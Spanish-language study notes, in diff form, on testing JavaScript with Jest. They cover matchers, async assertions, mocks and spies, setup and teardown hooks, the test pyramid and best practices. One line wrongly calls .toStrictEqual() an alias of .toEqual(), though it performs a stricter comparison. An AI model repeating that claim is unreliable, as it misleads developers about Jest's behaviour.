+3. Asíncrono (async/await)
+
+Una de las grandes ventajas de Jest es su excelente soporte para pruebas asíncronas
+
+##### Si la función que estás probando devuelve una Promesa, simplemente declaras la función callback del test() como async y usas await para esperar la resolución.
+
+```
+// Función que devuelve una Promesa
+async function obtenerDatos() {
+  return new Promise(resolve => setTimeout(() => resolve({ id: 1 }), 100));
+}
+
+// Test Case Asíncrono
+test('debe devolver un objeto con la propiedad id después de un retraso', async () => {
+    // Act (Usamos await para esperar que la promesa se resuelva)
+    const datos = await obtenerDatos(); 
+    
+    // Assert
+    expect(datos).toEqual({ id: 1 });
+});
+```
+
+
+4. Alias y Métodos Especiales
+
+Jest ofrece otros métodos útiles
+
+test.only(): Solo ejecutar esta prueba.
+Muy útil para la depuración, ya que ignora todas las demás pruebas.
+
+```
+test.only('sólo esta...', () => { ... });
+```
+
+test.skip(): Saltar o ignorar esta prueba
+Útil si una función aún no está implementada o si la prueba está rota temporalmente.
+
+```
+test.skip('saltar esta...', () => { ... });
+```
+
+
+
+#### Expect:
+
+expect() es la columna vertebral de las Aserciones
+inicio de toda verificación de prueba
+herramienta que utilizas para describir el valor real que estás probando.
+expect() toma el resultado de tu código y te permite encadenar un Matcher para verificar si cumple con la condición esperada
+
+1. Propósito: envolver el valor que se está probando
+##### exponer una serie de métodos de comparación, conocidos como Matchers.
+
+expect()	
+El valor real producido por el código.	
+expect(suma(1, 2))
+
+Matcher:
+La condición o el tipo de comparación.
+.toBe(3)
+
+
+2. Sintaxis y Encadenamiento
+##### expect(valorReal) devuelve un objeto especial que tiene todos los matchers disponibles como métodos (ej. .toBe, .toEqual, .toThrow).
+
+```
+const sumar = (a, b) => a + b;
+
+test('la función sumar debe ser correcta', () => {
+    // 1. Ejecutamos la función y pasamos el resultado a expect()
+    const resultado = sumar(4, 5); 
+    
+    expect(resultado).toBe(9); // 2. Encadenamos el Matcher .toBe()
+});
+```
+
+
+Modificador .not:
+modificar casi cualquier matcher con .not para verificar lo contrario de la condición.
+
+```
+test('un array no debe ser nulo', () => {
+    const lista = [];
+    expect(lista).not.toBeNull();
+});
+```
+
+Comprobaciones (Match-making):
+##### La elección del matcher encadenado es crucial
+determina la forma en que Jest compara los valores.
+
+1. Igualdad Estricta (.toBe)
+Utiliza el operador de igualdad estricta de JavaScript (===).
+Solo debe usarse para valores primitivos (números, cadenas, booleanos).
+`expect(2 + 2).toBe(4); // Pasa`
+
+2. Igualdad Profunda (.toEqual)
+Utiliza la igualdad recursiva (profunda) para comprobar si dos objetos o arrays tienen las mismas propiedades y valores, incluso si no son la misma instancia en memoria.
+Importante: Nunca uses .toBe para objetos/arrays.
+
+```
+const usuario = { id: 1, nombre: 'Ana' };
+expect(usuario).toEqual({ id: 1, nombre: 'Ana' }); // Pasa (mismos valores)
+
+// expect(usuario).toBe({ id: 1, nombre: 'Ana' }); // Falla (diferentes instancias en memoria)
+```
+
+Comprobación de Propiedades (Asíncrono):
+##### expect() también se usa para manejar resultados asíncronos y errores:
+
+1. .resolves
+Se utiliza para esperar que una Promesa se resuelva antes de aplicar un matcher.
+
+```
+await expect(fetchData()).resolves.toBeDefined();
+```
+
+2. .rejects
+Se utiliza para esperar que una Promesa sea rechazada
+
+```
+await expect(fetchData()).rejects.toThrow('No encontrado');
+```
+
+3. .toThrow()
+Se usa en funciones síncronas para verificar que se lance un error.
+
+```
+expect(() => dividir(1, 0)).toThrow();
+```
+
+
+
+#### To Be:
+Matcher de Igualdad estricta entre el valor real y el valor esperado.
+
+Encadena a la función expect() para afirmar que el valor que se está probando es exactamente el mismo que el valor esperado
+Uso Principal: Valores Primitivos:
+Números, Cadenas de texto (Strings), Booleanos (true, false), Valores especiales (null, undefined)
+
+```
+const resultadoSuma = 5 + 3;
+
+test('la suma debe ser 8', () => {
+    // Éxito: El número 8 es estrictamente igual al número 8
+    expect(resultadoSuma).toBe(8); 
+});
+
+test('el valor debe ser verdadero', () => {
+    expect(true).toBe(true);
+});
+
+test('la cadena de texto debe coincidir exactamente', () => {
+    expect("Hola Mundo").toBe("Hola Mundo");
+});
+```
+
+
+Cuándo NO Usar .toBe():
+El error más común para los desarrolladores que comienzan con Jest es usar .toBe() para comparar objetos o arrays.
+
+Falla con Objetos y Arrays:
+En JavaScript, los objetos y los arrays son tipos de datos que se copian por referencia
+Esto significa que dos objetos pueden tener exactamente las mismas propiedades y valores, pero nunca son estrictamente iguales (===) a menos que apunten al mismo lugar en la memoria.
+
+
+##### Assertions es expect()
+
+
+#### Matchers
+El matcher es la regla de comparación
+Convierte la aserción en una pregunta específica que tiene una respuesta binaria (Pasa/Falla).
+
+Matcher	| Valor Real | Comparación | Valor Esperado | Resultado
+
+1. .toBe(): 
+5
+¿Es estrictamente igual a? (===)
+5
+Pasa
+
+2. .toEqual():
+{id: 1}
+¿Tiene la misma estructura que?
+{id: 1}
+Pasa
+
+3. .toThrow()
+Función
+¿Lanza un error cuando se ejecuta?
+(Ninguno o mensaje)
+Pasa/Falla
+
+
+Esenciales (Igualdad):
+Estos matchers se centran en verificar la igualdad entre valores.
+
+toBe(expected) (Igualdad Estricta):
+Uso: Para valores primitivos (números, strings, booleanos, null, undefined).
+Mecanismo: Usa el operador ===.
+Advertencia: Falla con objetos o arrays porque compara la referencia en memoria.
+
+```
+test('la suma debe ser 10', () => {
+    expect(5 + 5).toBe(10);
+});
+test('el valor debe ser nulo', () => {
+    expect(null).toBeNull(); // .toBeNull() es un alias de .toBe(null)
+});
+```
+
+toEqual(expected) (Igualdad Profunda)
+Uso: Para objetos y arrays.
+Mecanismo: Comprueba de forma recursiva (profunda) si cada propiedad y valor en el objeto o array real coincide con el esperado
+independientemente de si son la misma instancia en memoria.
+
+```
+const usuario = { id: 1, activo: true };
+
+test('el objeto de usuario debe coincidir con la estructura', () => {
+    expect(usuario).toEqual({ id: 1, activo: true });
+});
+```
+
+Matchers de Verdad y Falsedad (Truthy/Falsy):
+##### Estos matchers evalúan la validez de un valor en el contexto de un if de JavaScript.
+
+Matcher | Función |	Acepta Valores Como...
+
+1. .toBeTruthy():
+El valor es evaluado como verdadero.
+Cualquier cosa excepto false, 0, "", null, undefined, NaN.
+
+2. .toBeFalsy():
+El valor es evaluado como falso.
+false, 0, "", null, undefined, NaN.
+
+3. .toBeDefined():
+El valor no es undefined.
+Cualquier cosa excepto undefined.
+
+4. .toBeUndefined():
+El valor es undefined.
+Solo undefined.
+
+```
+test('el resultado debe ser truthy', () => {
+    expect(1).toBeTruthy();
+    expect("lleno").toBeDefined();
+});
+```
+
+
+Matchers de Arrays y Propiedades
+Para verificar la estructura o el contenido de colecciones.
+
+1. .toHaveLength(number)
+Verifica la longitud de un array o string.
+`expect([1, 2, 3]).toHaveLength(3);`
+
+2. .toContain(item)
+Verifica si un array contiene un elemento específico.
+`expect([1, 2, 3]).toContain(2);`
+
+3. .toHaveProperty(key, value)
+Verifica si un objeto tiene una propiedad específica y, opcionalmente, un valor.
+`expect(user).toHaveProperty('id', 42);`
+
+
+Matchers de Excepciones y Asincronía
+##### Cruciales para el manejo de errores y pruebas asíncronas.
+
+Excepciones (Síncronas):
+
+1. .toThrow(error?): Verifica que una función lanza un error cuando se ejecuta. 
+La función debe estar envuelta en una función callback
+(como una función flecha) dentro del expect().
+
+```
+const dividir = (a, b) => { if (b === 0) throw new Error('Cero'); return a / b; };
+
+test('debe lanzar error al dividir por cero', () => {
+    // La función debe estar envuelta para que toThrow pueda capturar la excepción.
+    expect(() => dividir(10, 0)).toThrow('Cero');
+});
+```
+
+
+Asincronía (Promesas):
+
+1. .resolves: Se antepone a otro matcher para esperar que la Promesa se resuelva.
+
+2. .rejects: Se antepone a otro matcher para esperar que la Promesa se rechace.
+
+```
+test('la promesa debe resolverse con datos', async () => {
+    await expect(fetchDatos()).resolves.toBeDefined();
+});
+
+test('la promesa debe rechazarse con un error', async () => {
+    await expect(fetchDatosConError()).rejects.toThrow('Fallo de red');
+});
+```
+
+
+
+## 2. Pruebas Unitarias (Unit Testing)
+
+### 1. Alcance de una Unidad:
+Probar la lógica de la unidad más pequeña y aislada de código (una función, un método de clase).
+Asegurar que la función, dado un input, produce el output correcto o el efecto secundario esperado.
+
+
+#### Unit test
+verificación automatizada que se enfoca en la unidad más pequeña y aislada de código en tu aplicación.
+
+Definición de unidad:
+La "unidad" puede ser:
+
+1. Una función individual (ej. sumar(a, b)).
+2. Un método dentro de una clase.
+3. Una clase completa. 
+4. Un módulo que realiza una tarea específica.
+
+El objetivo es confirmar que cada componente individual de tu sistema funciona correctamente según lo diseñado
+bajo diversas condiciones de entrada.
+
+
+Aislamiento:
+Principio clave de las pruebas unitarias
+
+##### Una prueba unitaria no debe depender de recursos externos.
+##### No debe interactuar con la red, la base de datos, el sistema de archivos, o servicios externos (APIs de terceros).
+
+##### Si una unidad depende de otra unidad (ej. Función A llama a Función B)
+##### la dependencia se reemplaza por un mock o spy (simulación)
+##### para garantizar que solo se pruebe la lógica de la unidad A.
+
+Una prueba unitaria se adhiere al patrón AAA (Arrange, Act, Assert):
+
+```
+// Función a probar (la "unidad")
+function calcularDescuento(precio, porcentaje) {
+  if (porcentaje >= 1) { // Lógica de negocio
+    return precio;
+  }
+  return precio * (1 - porcentaje);
+}
+
+// Prueba Unitaria con Jest
+test('debe aplicar un 10% de descuento correctamente', () => {
+  // 1. ARRANGE (Preparar)
+  const precioOriginal = 100;
+  const descuento = 0.10;
+  
+  // 2. ACT (Actuar)
+  const precioFinal = calcularDescuento(precioOriginal, descuento);
+  
+  // 3. ASSERT (Aserción)
+  expect(precioFinal).toBe(90); // Verificar el resultado esperado
+});
+```
+
+
+Pirámide:
+
+```
+Manual test
+
+ui test	
+			(E2E)	(More Integration) / Slower
+api test
+
+Integration test
+
+Component test
+
+Unit test	(More Isolation) / Faster
+```
+
+El proyecto debe tener muchas más pruebas unitarias que pruebas de integración o End-to-End
+Si el 90% de tus fallos se pueden detectar con pruebas unitarias rápidas, tu ciclo de desarrollo se vuelve mucho más eficiente.
+
+
+
+### 2. Mocks, Spies y Stubs
+Mocks: Objetos falsos que reemplazan dependencias externas (ej. llamadas a APIs, acceso a bases de datos) para aislar la unidad bajo prueba.
+Spies: Observadores que envuelven una función existente para rastrear si fue llamada, cuántas veces y con qué argumentos.
+Uso de jest.fn(), jest.mock(), y jest.spyOn().
+
+
+#### Mocks
+Simulacros, permiten aislar la unidad de código que estás probando
+Reemplazando sus dependencias externas con sustitutos controlados.
+
+Un Mock es un objeto o una función simulada que imita el comportamiento real de una dependencia
+Su propósito es doble:
+
+##### 1. Aislamiento: Evitar que la unidad de código a probar interactúe con el mundo exterior (bases de datos, APIs de red, sistema de archivos).
+##### 2. Control: Permitir que el desarrollador defina exactamente qué resultado debe producir esa dependencia simulada
+##### (ej. "cuando llames a la API, devuelve este error" o "devuelve estos datos específicos").
+
+Problema de la Dependencia:
+Imagina que estás probando una función obtenerPost():
+
+```
+function obtenerPost(id) {
+  // Llama a una API real (DEPENDENCIA EXTERNA)
+  return fetch(`/api/posts/${id}`); 
+}
+```
+
+##### Si ejecutas una prueba unitaria de obtenerPost() sin mocks, la prueba sería:
+##### Lenta: Tendría que esperar la respuesta de la red.
+##### No Fiable: Fallaría si la red está caída o si la API real cambia su respuesta.
+##### No Unitaria: Estaría probando la red y la API, no solo la lógica de tu función.
+
+##### Solución con Mocks: Reemplazas la función fetch por un mock que, al ser llamado, devuelve una respuesta falsa e instantánea.
+
+
+Mocks vs. Spies y Stubs (Tipos de Simulación):
+El término "Mock" a menudo se usa de manera general para cualquier sustituto.
+Sin embargo, en testing, existen distinciones técnicas:
+
+Mock:
+Simular la implementación.
+##### Permite definir qué debe devolver la función simulada y, opcionalmente, verificar que fue llamada.
+
+Spy (Espía):
+Observar sin modificar.
+##### Envuelve una función real y registra si fue llamada, con qué argumentos y cuántas veces, pero deja que la función real se ejecute.
+
+Stub:
+Sustituir la implementación.
+##### Es una implementación mínima que siempre devuelve una respuesta codificada (hardcoded) para evitar que se ejecute la lógica real.
+
+##### En Jest, la herramienta nativa jest.fn() actúa como una combinación muy flexible de los tres.
+
+
+Mocks con Jest:
+Jest ofrece una API muy fácil de usar para crear mocks.
+
+1. Mockear Funciones Individuales (jest.fn())
+##### Se usa para reemplazar funciones que están pasando como argumentos o que declaras tú mismo.
+
+```
+test('la función callback debe ser llamada una vez', () => {
+    // 1. Arrange: Creamos un Mock
+    const mockCallback = jest.fn(); 
+    
+    // 2. Act: Llamamos a la función que usa el callback
+    ejecutarCallback(mockCallback);
+    
+    // 3. Assert: Verificamos si el Mock fue llamado
+    expect(mockCallback).toHaveBeenCalledTimes(1); 
+});
+```
+
+2. Mockear Implementaciones Específicas (.mockReturnValue())
+##### Defines qué valor debe devolver la función simulada al ser llamada.
+
+```
+test('debe usar el valor simulado', () => {
+    const mockObtenerPrecio = jest.fn();
+    
+    // El Mock siempre devolverá 100
+    mockObtenerPrecio.mockReturnValue(100); 
+    
+    // Act: La función a probar llamará al Mock
+    const precioFinal = procesarPrecio(mockObtenerPrecio); 
+    
+    expect(precioFinal).toBe(100); 
+});
+```
+
+3. Mockear Módulos Enteros (jest.mock())
+##### Se usa para simular módulos externos (ej. una librería de HTTP, un utility file).
+
+```
+// Archivo: __tests__/post.test.js
+// Esto reemplaza el módulo 'axios' en cualquier sitio donde se importe
+jest.mock('axios'); 
+
+test('debe devolver los datos del post simulado', async () => {
+    // Definimos qué debe devolver axios.get cuando sea llamado
+    axios.get.mockResolvedValue({ data: { titulo: 'Simulado' } });
+
+    const post = await obtenerPost(1);
+    
+    expect(post.titulo).toBe('Simulado');
+    expect(axios.get).toHaveBeenCalledWith('/api/posts/1'); // Spy check
+});
+```
+
+
+### 3. Setup y Teardown
+
+Uso de funciones de hook (beforeAll, beforeEach, afterEach, afterAll) para inicializar y limpiar el estado antes y después de las pruebas.
+
+##### Ejecutar código antes o después de la ejecución de tus Test Suites (describe) o Test Cases (test).
+
+1. Propósito: 
+##### Las pruebas, especialmente las unitarias y de integración, deben ser independientes
+##### El resultado de una prueba no debe influir en el resultado de otra.
+Los Hooks se aseguran de esto:
+
+Configuración (Setup): Poner el entorno en el estado inicial requerido
+(ej. crear un objeto de prueba, inicializar una base de datos simulada).
+
+Limpieza (Teardown): Devolver el entorno a un estado limpio después de que las pruebas han terminado
+(ej. eliminar datos creados, cerrar conexiones).
+
+
+2. Tipos de Hooks
+Jest proporciona cuatro funciones de hook principales
+##### diferenciadas por si se ejecutan una vez (a nivel de Suite)
+o antes/después de cada prueba (a nivel de Case).
+
+#### Hook	Ejecución	Nivel de Ejecución	Uso Común
+
+beforeAll(fn):
+Una vez antes de que comience el primer test() de la Suite.
+Suite (describe)
+Inicializar recursos caros que pueden ser reutilizados, como crear una base de datos simulada o configurar un servidor de prueba
+
+afterAll(fn):
+Una vez después de que todos los test() de la Suite hayan finalizado
+Suite (describe)
+Tareas de limpieza pesadas, como apagar el servidor de prueba o cerrar la base de datos
+
+beforeEach(fn):
+Antes de cada test() individual dentro de la Suite.
+Case (test)
+Restablecer el estado de las variables, limpiar mocks o inicializar un componente de UI para que cada prueba comience desde cero
+
+afterEach(fn):
+Después de cada test() individual dentro de la Suite.
+Case (test)
+Limpiar mocks específicos o restaurar el estado global
+(ej. restaurar la implementación de console.log).
+
+
+##### Ej: Imagina que estás probando una clase Carrito y necesitas asegurarte de que cada prueba comienza con un carrito vacío:
+
+```
+// La clase de producción a probar
+class Carrito {
+    constructor() {
+        this.items = [];
+    }
+    agregar(item) {
+        this.items.push(item);
+    }
+    total() {
+        return this.items.length;
+    }
+}
+
+describe('Funcionalidad del Carrito de Compras', () => {
+    let carrito; // Variable que queremos inicializar antes de cada prueba
+
+    // HOOK beforeEach: Garantiza un estado limpio para cada test
+    beforeEach(() => {
+        // Ejecutado antes del Test 1, antes del Test 2, etc.
+        carrito = new Carrito(); 
+        console.log("-> Carrito reiniciado."); 
+    });
+
+    test('El carrito debe estar vacío al inicio', () => {
+        expect(carrito.total()).toBe(0); // Pasa porque beforeEach lo vació
+    });
+
+    test('debe agregar un artículo correctamente', () => {
+        carrito.agregar('manzana');
+        expect(carrito.total()).toBe(1); // Este test se ejecuta con un carrito vacío, gracias al beforeEach
+    });
+    
+    // El Test 3 también se ejecutará con un carrito vacío.
+    test('no debe afectar a otras pruebas', () => {
+        expect(carrito.items).toEqual([]);
+    });
+
+});
+```
+
+
+Hooks en Estructuras Anidadas:
+##### Los hooks operan en el ámbito (scope) del describe() en el que están definidos
+Si anidas describe(), los hooks del nivel superior se ejecutan para todos los niveles inferiores.
+
+##### Si tienes un beforeEach en el describe externo, se ejecutará antes de cada prueba, incluso las que están en el describe anidado.
+
+Esta característica te permite configurar un entorno general (con beforeAll externo)
+Luego afinar el estado para subgrupos de pruebas con beforeEach en un describe anidado.
+
+
+
+
+
+## 3. Pruebas de Integración (Integration Testing)
+
+Verificar que diferentes partes de tu sistema funcionan correctamente juntas.
+
+1. Definición y Propósito:
+Probar la interacción entre dos o más unidades (ej. un controlador y un servicio, un componente y una tienda de estado).
+
+### 2. Integración de Servicios (Back-End):
+Probar endpoints de API utilizando herramientas como supertest para simular solicitudes HTTP (GET, POST, etc.) y verificar las respuestas.
+Trabajar con una base de datos de pruebas separada.
+
+### 3. Integración de Componentes (Front-End):
+Probar cómo interactúan componentes hermanos o padre-hijo (ej. un formulario que pasa datos a un botón).
+Simular el rendering y eventos del usuario.
+
+
+
+## 4. Pruebas de Interfaz de Usuario y E2E (Front-End Testing)
+
+Simular el comportamiento del usuario final y validar la experiencia completa de la aplicación.
+
+### 1. Pruebas de Componentes (ej. con React Testing Library o Vue Test Utils):
+Enfoque en las pruebas de comportamiento del usuario en lugar de los detalles internos del componente.
+Uso de selectores accesibles (getByRole, getByText).
+Disparo de eventos del usuario (fireEvent o userEvent).
+
+
+### 2. Pruebas End-to-End (E2E):
+Herramientas: Cypress o Playwright.
+Simular un flujo completo del usuario en un navegador real o headless (ej. "Navegar a la página de inicio, iniciar sesión, agregar un artículo al carrito y finalizar la compra").
+Configuración y fixtures (datos de prueba).
+
+
+
+## 5. Técnicas Avanzadas y Métricas
+
+Llevan tus prácticas de testing al siguiente nivel.
+
+### 1. Cobertura de Código (Code Coverage):
+Métricas: Cobertura de líneas, funciones y ramas.
+Cómo generar informes de cobertura (Jest lo hace de forma nativa).
+Establecer umbrales de cobertura obligatorios.
+
+
+
+### 2. Test Driven Development (TDD):
+El ciclo Rojo-Verde-Refactorizar (Escribir la prueba que falla → Escribir el código mínimo para que pase → Refactorizar).
+
+
+
+### 3. Pruebas de Regresión y Pruebas de Humo:
+Regresión: Asegurar que los cambios nuevos no rompieron la funcionalidad existente.
+Humo: Un conjunto pequeño de pruebas de alta prioridad para asegurar que la aplicación más básica funciona.
+
+
+
+## Recorrido
+
+1. Configura Jest en un proyecto pequeño.
+2. Escribe pruebas unitarias para una función pura, usando expect() y toBe().
+3. Escribe pruebas unitarias para una función que depende de una API, usando Mocks para simular la respuesta de la API.
+4. Añade una prueba de integración simple que verifique la comunicación entre dos módulos de tu código.
+5. Si usas un framework de interfaz (React/Vue/Angular), integra RTL/Cypress/Playwright y escribe tu primera prueba E2E.
+
+
+## Buenas prácticas Testing
+
+Además de escribir pruebas, integrarlas eficientemente en el ciclo de desarrollo
+
+1. Proporción
+Seguir el modelo de la Pirámide de Pruebas
+
+Amplia Base Unitaria: El grueso de tu suite de pruebas (alrededor del 70-80%) debe ser de Pruebas Unitarias
+Son rápidas, baratas y proporcionan feedback instantáneo.
+
+Capas Intermedias: Un porcentaje menor (alrededor del 10-20%) debe ser de Pruebas de Integración para verificar que los componentes
+(servicios, bases de datos simuladas, APIs) trabajen juntos.
+
+Cúspide Estratégica: La capa más pequeña (alrededor del 5-10%) debe ser de Pruebas End-to-End (E2E).
+Resérvalas solo para los flujos de usuario más críticos.
+
+
+2. Enfoque y Aislamiento (Pruebas Unitarias)
+Pruebas unitarias sean efectivas siguiendo estos principios:
+
+Principio F.I.R.S.T.: Las pruebas deben ser:
+Fast (Rápidas): Se ejecutan rápidamente para feedback constante.
+Isolated (Aisladas): Cada prueba se ejecuta de forma independiente, sin depender de otras.
+Repeatable (Repetibles): Producen el mismo resultado cada vez que se ejecutan.
+Self-Validating (Autovalidables): Pasan o fallan por sí mismas, sin intervención humana.
+Timely (Oportunas): Se escriben antes (o inmediatamente después) del código de producción.
+
+Aislar Dependencias: Utiliza Mocks, Stubs y Spies para reemplazar recursos externos lentos o volátiles 
+(red, bases de datos, APIs de terceros)
+La prueba debe fallar por tu lógica, no por un fallo de red.
+
+Probar la Intención: No pruebes la implementación interna (cómo se hacen las cosas),
+sino el comportamiento y el resultado (qué hacen las cosas). 
+Esto facilita la refactorización.
+
+
+3. Organización y Legibilidad
+Una prueba bien escrita es tan importante como un buen código de producción.
+
+##### Estructura AAA: Organiza la lógica de cada Test Case en tres secciones claras:
+Arrange (Preparar): Configurar el entorno y los datos de entrada.
+Act (Actuar): Ejecutar el código que se está probando.
+Assert (Aserción): Verificar el resultado esperado
+
+##### describe() Claro: Utiliza Test Suites (describe()) para agrupar pruebas por componente, clase o módulo
+utiliza nombres que proporcionen contexto.
+
+##### Nombres Expresivos: El nombre de la prueba (test()/it()) debe ser una oración completa que describa el comportamiento esperado, por ejemplo:
+test('debe lanzar un error si el usuario no tiene permisos').
+
+##### Hooks para Configuración: Utiliza Funciones de Hook (beforeEach, afterAll, etc.)
+para gestionar la configuración y limpieza del entorno, manteniendo el código de prueba limpio y enfocado.
+
+
+4. Integración Continua (CI) y Cobertura
+Las pruebas deben ser una parte automática y obligatoria del proceso de desarrollo.
+
+Automatización con CI: Configura tu sistema de Integración Continua (CI) (ej. GitHub Actions, Jenkins)
+para que ejecute automáticamente toda tu suite de pruebas en cada push o pull request.
+
+"No Merge en Rojo": Nunca permitas que se fusione (merge) código nuevo en la rama principal si las pruebas automatizadas fallan.
+
+Monitorear la Cobertura: Monitorea la Cobertura de Código para identificar áreas de tu código que no están siendo probadas
+Sin embargo, no uses la cobertura como una métrica de calidad absoluta; un 100% de cobertura de líneas no garantiza que tu lógica sea correcta.
+Enfócate en la cobertura de rutas críticas y lógicas de negocio.
+
+
+5. Manejo de Errores (Prueba los Fallos) 
+##### Las mejores pruebas confirman que el sistema funciona bajo condiciones ideales y que maneja los fallos correctamente.
+
+#### Probar Casos Borde (Edge Cases): Incluye pruebas para entradas extremas, límites (mínimo/máximo), entradas nulas/vacías y formatos inesperados.
+
+#### Probar el Manejo de Excepciones: Asegúrate de que tu código lanza los errores correctos (expect().toThrow())
+cuando algo sale mal y que puede recuperarse o mostrar el error de forma controlada.
+
+#### Comprobar la Inmutabilidad: En pruebas donde se realizan cambios (ej. añadir un elemento a una lista)
+verifica que solo se haya modificado lo que se supone que debe modificarse
+y que las entradas originales permanezcan inmutables si esa es la intención.
+
+
+
+### Unit Test
+Maximizar su eficiencia, velocidad y fiabilidad. 
+Al ser la base de la Pirámide de Pruebas, deben ser robustas y fáciles de mantener.
+
+1. F.I.R.S.T.
+
+Fast (Rápidas): Las pruebas deben ejecutarse en milisegundos
+Si las pruebas unitarias son lentas, los desarrolladores evitan ejecutarlas, lo que rompe el ciclo de feedback rápido.
+
+Isolated (Aisladas): Una prueba no debe depender del estado de otras pruebas
+##### Utiliza Hooks (beforeEach) para resetear el entorno y Mocks para aislar dependencias.
+
+Repeatable (Repetibles): La prueba debe producir el mismo resultado cada vez que se ejecuta
+##### Evita dependencias externas no controladas (fechas, números aleatorios, llamadas a red).
+
+Self-Validating (Autovalidables): La prueba debe pasar o fallar por sí misma, sin requerir una inspección manual de la salida.
+
+Timely (Oportunas): Escribe las pruebas antes o inmediatamente después de escribir el código de producción
+Esto ayuda a diseñar el código de manera que sea testeable.
+
+
+2. Aislamiento y Control de Dependencias
+
+Aspecto más crítico del Unit Testing para garantizar que solo se pruebe la unidad en cuestión.
+
+##### Mockear el Mundo Exterior: Reemplaza todas las dependencias externas con Mocks o Stubs
+Llamadas HTTP (fetch, axios).
+Bases de Datos (ej. MongoDB, SQL).
+Sistema de Archivos (I/O).
+Funciones globales que no controlas (ej. setTimeout, Date).
+
+##### Evitar Dependencias de Clase: Si la Unidad A depende de la Unidad B, simula la Unidad B si su lógica es compleja o su inicialización es costosa. Solo prueba la lógica de la Unidad A.
+
+Evitar el console.log en el Código de Prueba: Los logs hacen que las pruebas sean difíciles de leer.
+Si necesitas depurar, usa un debugger o un spy de testing.
+
+
+3. Estructura y Legibilidad
+Una prueba debe ser fácil de leer para que cualquiera
+
+Sintaxis AAA (Arrange, Act, Assert): Estructura el cuerpo de tu test() de forma clara:
+Arrange (Preparar): Declara variables, mocks y configura el estado inicial.
+Act (Actuar): Ejecuta la unidad de código que estás probando.
+Assert (Aserción): Usa Matchers (expect().toBe(), .toEqual()) para verificar el resultado.
+
+Nombres Descriptivos: Los nombres del test() deben ser frases completas que describan el comportamiento esperado y la condición bajo la cual se prueba.
+Malo: test('prueba suma')
+Bueno: test('debe devolver la suma correcta de dos números positivos')
+
+##### describe() Lógico: Agrupa las pruebas relacionadas con un módulo o componente específico.
+##### Usa anidamiento (nested describe) para probar diferentes contextos o estados 
+(ej. "Cuando el usuario no tiene permisos...").
+
+
+4. Cobertura y Enfoque
+
+##### Probar Rutas de Ejecución: Asegúrate de que las pruebas unitarias cubran el caminos felices (happy path)
+también los caminos infelices (error handling).
+
+Probar Casos Borde (Edge Cases): Incluye valores que están en los límites de tu lógica
+(ej. el número 0, el string vacío "", el valor máximo permitido, fechas de inicio y fin).
+
+Probar Comportamiento, No Implementación: No pruebes cómo funciona tu código internamente
+(ej. mocks que comprueban llamadas a funciones privadas).
+Prueba la interfaz pública y el resultado (el valor devuelto o el estado modificado).
+
+
+5. Manejo de Errores
+
+##### Probar Fallos con toThrow(): Asegúrate de que si tu función debe lanzar un error bajo ciertas condiciones
+(ej. argumento inválido), la prueba verifica que ese error es lanzado correctamente, usando expect(() => func()).toThrow().
+
+##### Probar Promesas con .rejects: Para funciones asíncronas, verifica que las Promesas se rechazan correctamente para manejar fallos de API o timeouts usando await expect(asyncFunc()).rejects.toThrow().
+
+
+
+### Assertions
+Definen qué significa que tu código sea "correcto".
+Aplicar buenas prácticas al usar expect() y Matchers te garantiza pruebas fiables, legibles y fáciles de depurar.
+
+1. Principio de Aserción Única (Ideal)
+Aunque no siempre es estrictamente posible o deseable
+la práctica ideal es que cada Test Case (test()) tenga un propósito único y se centre en una sola aserción.
+
+Propósito Único: El nombre de la prueba debe describir lo que estás probando (ej. "debe calcular el 10% de descuento").
+##### Fácil de Depurar: Si la prueba falla, sabes exactamente qué comportamiento falló, sin tener que revisar múltiples aserciones.
+
+Malo (Múltiples Propósitos/Aserciones Complejas en un Solo Test):
+
+```
+test('debe devolver un usuario y tener las propiedades correctas', () => {
+    const usuario = crearUsuario(datos);
+    expect(usuario.id).toBeDefined(); // Aserción 1
+    expect(usuario.nombre).toBe('Juan'); // Aserción 2
+    expect(usuario.activo).toBeTruthy(); // Aserción 3
+});
+```
+
+Mejor: 
+
+```
+test('debe asignar una ID al crear un usuario', () => {
+    expect(crearUsuario(datos).id).toBeDefined();
+});
+test('el campo nombre debe coincidir con el input', () => {
+    expect(crearUsuario(datos).nombre).toBe('Juan');
+});
+```
+
+
+2. Matcher Correcto
+Crucial para evitar errores comunes (especialmente el uso incorrecto de .toBe).
+
+Valores Primitivos: Usa .toBe() solo para números, cadenas, booleanos, null y undefined. Comprueba la igualdad estricta (===).
+
+Objetos y Arrays: Usa .toEqual() (o su alias .toStrictEqual()) para comparar la estructura interna (igualdad profunda) de objetos y arrays
+Nunca uses .toBe() para estos tipos, ya que fallará debido a la diferencia de referencias en memoria.
+
+Números Decimales: Usa .toBeCloseTo() para comparar números de punto flotante
+Esto evita fallos debido a las imprecisiones nativas de la aritmética de JavaScript.
+
+```
+test('la división debe ser cercana a 0.33', () => {
+    expect(1 / 3).toBeCloseTo(0.333333, 6); // 6 decimales de precisión
+});
+```
+
+
+3. Aserciones Legibles y Expresivas
+##### La prueba debe ser legible como una frase. Utiliza los matchers que expresen de mejor manera tu intención.
+
+Preferir Matchers Explícitos: En lugar de usar .toBe(null) o .toBe(undefined)
+utiliza los matchers específicos que son más claros
+
+Genérico:
+expect(valor).toBe(null)
+expect(valor).toBe(undefined)
+expect(valor).toBe(true)
+
+Específico:
+expect(valor).toBeNull()
+expect(valor).toBeUndefined()
+expect(valor).toBeTruthy() (si cualquier valor truthy es aceptable)
+
+
+##### Encadenar Matchers para la Claridad Asíncrona: Asegúrate de usar .resolves y .rejects para manejar las Promesas correctamente
+
+```
+CLARO: Intención es esperar resolución y luego comparar.
+await expect(llamadaAPI()).resolves.toEqual({ estado: 'ok' });
+```
+
+```
+MENOS CLARO: Requiere más código para el mismo propósito.
+const resultado = await llamadaAPI(); 
+expect(resultado).toEqual({ estado: 'ok' });
+```
+
+
+4. Probar la Falta de Aserción y Errores
+##### Las aserciones no solo deben verificar el éxito, sino también la existencia de fallos.
+
+Aserción Cero: Si una prueba no contiene ninguna aserción (expect()), Jest asumirá que la prueba pasó
+Utiliza expect.assertions(count) o expect.hasAssertions() para obligar a la prueba a ejecutar un número mínimo de aserciones.
+Esto es vital cuando pruebas código asíncrono.
+
+Probar Errores (Excepciones): Cuando pruebas el manejo de errores síncronos, asegúrate de que la aserción esté anidada correctamente
+
+```
+test('debe lanzar un error con mensaje de permisos', () => {
+    // La función debe estar envuelta en una función para que toThrow la capture
+    expect(() => funcionConPermisos()).toThrow('Permisos denegados');
+});
+```
+
+not con Precisión: Utiliza el modificador .not para verificar que un valor no cumple con una condición
+Por ejemplo, si un array de filtros no debe contener un ID específico.
+
+```
+expect(arrayDeIds).not.toContain(99);
+```
+
+
